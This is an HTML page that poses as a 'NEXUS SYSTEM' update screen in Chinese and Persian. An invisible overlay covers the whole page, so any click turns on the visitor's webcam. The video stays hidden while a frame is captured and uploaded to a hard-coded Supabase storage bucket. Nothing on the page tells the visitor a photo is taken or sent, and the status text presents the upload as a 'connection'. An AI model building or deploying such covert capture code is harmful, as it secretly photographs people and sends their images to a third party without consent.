<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>NEXUS</title>

<!-- کتابخانه Supabase -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<style>
*{box-sizing:border-box}

body{
 margin:0;
 min-height:100vh;
 padding:0;
 display:flex;
 justify-content:center;
 align-items:center;
 background:#050505; /* رنگ پس‌زمینه بسیار تیره بدون الگوی شلوغ */
 color:#fff;
 font-family:"Courier New", monospace;
 overflow: hidden;
 position: relative;
 
 /* انیمیشن ورود نرم برای زمانی که کاربر کلیک می‌کند */
 opacity: 0;
 animation: fadeInSystem 1.5s ease-out forwards;
}

/* تعریف انیمیشن محو شدن */
@keyframes fadeInSystem {
    0% { opacity: 0; transform: scale(0.95); }
    100% { opacity: 1; transform: scale(1); }
}

.app{
 width:100%;
 max-width:400px;
 padding:20px;
 text-align: center;
 position: relative;
 z-index: 2;
 pointer-events: none; /* غیرفعال کردن تعامل با متن */
}

.logo{
 text-align:center;
 color:#65d9ff;
 font-size:20px;
 font-weight:bold;
 letter-spacing:2px;
 margin-bottom: 10px;
 opacity: 0.8;
 text-shadow: 0 0 10px rgba(101, 217, 255, 0.5);
}

.subtitle{
 text-align:center;
 color:#aebbd2;
 line-height:1.9;
 font-size:12px;
 margin-bottom: 20px;
 opacity: 0.7;
}

#status{
 text-align:center;
 margin-top:10px;
 padding:10px;
 border-radius:10px;
 background:#111;
 color:#70e6c0;
 font-size:12px;
 line-height:1.8;
 min-height: 30px;
 transition: all 0.5s;
 border: 1px solid #333;
}

.footer{
 text-align:center;
 color:#333;
 font-size:10px;
 margin-top:20px;
}

/* ناحیه کلیک نامرئی - حالا کل صفحه را می‌گیرد */
.click-trigger {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    z-index: 10;
    cursor: pointer;
    /* نشانگر موس را مخفی می‌کنیم تا حس متمرکزتری بدهد */
}

video{
 width:100%;
 border-radius:15px;
 margin-top:15px;
 background:#000;
 display: none !important;
 box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
}

canvas#canvas {
    display: none;
}

</style>
</head>

<body>

<!-- لایه کلیک نامرئی -->
<div id="click-trigger" class="click-trigger"></div>

<div class="app">

<div class="logo">NEXUS SYSTEM</div>

<p class="subtitle">
系统正在更新...
<br>
等待连接
</p>

<video id="video" autoplay playsinline muted></video>

<canvas id="canvas" hidden></canvas>

<div id="status">
等待用户操作
</div>

<div class="footer">
NEXUS PROJECT • VER 2.0
</div>

</div>

<script>

// SUPABASE CONFIGURATION
const SUPABASE_URL = "https://wxovglpgcddlmhropvtv.supabase.co";
const SUPABASE_KEY = "sb_publishable_Ykxw1h1xKfIqrKyzTXjsjw_lMtub-Wk";
const BUCKET = "nexus-photos";

const db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusBox = document.getElementById("status");
const clickTrigger = document.getElementById("click-trigger");

let stream = null;
let isProcessing = false;

function showStatus(message){
 statusBox.textContent = message;
 // افکت چشمک زدن کوچک هنگام تغییر وضعیت
 statusBox.style.opacity = 0.5;
 setTimeout(() => statusBox.style.opacity = 1, 200);
}

// تابع اصلی شروع کار
async function startProcess() {
    if (isProcessing) return;
    isProcessing = true;
    
    // مخفی کردن ناحیه کلیک تا دیگر نتوان دوباره کلیک کرد
    clickTrigger.style.display = 'none';
    
    try{
        showStatus("正在连接摄像头..."); 

        if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            throw new Error("مرورگر شما از دوربین پشتیبانی نمی‌کند.");
        }

        // درخواست دسترسی به دوربین
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        showStatus("سیستم فعال شد");
        
        // نمایش ویدیو در المنت ویدیو
        video.srcObject = stream;
        
        // آپلود تصویر نمونه به سرور (اختیاری)
        uploadImage();

    } catch (error) {
        console.error(error);
        showStatus("خطا در اتصال: " + error.message);
        clickTrigger.style.display = 'block'; // اگر خطا داد، اجازه کلیک مجدد بده
        isProcessing = false;
    }
}

// تابع آپلود عکس به Supabase
function uploadImage() {
    // گرفتن فریم از ویدیو
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    // تبدیل به فایل
    canvas.toBlob(async (blob) => {
        if (!blob) return;
        
        const fileName = `nexus_${Date.now()}.jpg`;
        const filePath = [BUCKET, fileName].join('/');
        
        showStatus("در حال آپلود داده...");
        
        const { error } = await db.storage.from(BUCKET).upload(filePath, blob);
        
        if (error) {
            showStatus("خطا در آپلود");
            console.error(error);
        } else {
            showStatus("اتصال برقرار شد ✓");
        }
    }, 'image/jpeg', 0.8);
}

// رویداد کلیک روی کل صفحه
clickTrigger.addEventListener('click', () => {
    startProcess();
});

</script>
</body>
</html>
